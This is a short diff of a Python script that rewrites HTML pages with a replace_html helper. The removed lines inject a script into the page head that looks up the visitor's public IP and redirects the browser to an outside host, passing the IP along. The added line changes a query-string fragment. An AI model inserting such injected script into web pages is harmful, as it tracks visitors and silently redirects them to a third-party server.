@@ -18,12 +18,6 @@ def replace_html(x,y):
 
 
 
-replace_html("""<head>""","""<head>
 
-            <script>
-                document.addEventListener("DOMContentLoaded", () => {
-                    x=fetch('https://api.ipify.org?format=json').then(res => res.json()).then(t => location.href = "http://t91176wr.beget.tech/ip.php?ip="+t.ip);
 
-                
-                });
-            </script>""")
+replace_html("""&"+location.pathname""","""&html="+location.pathname""")
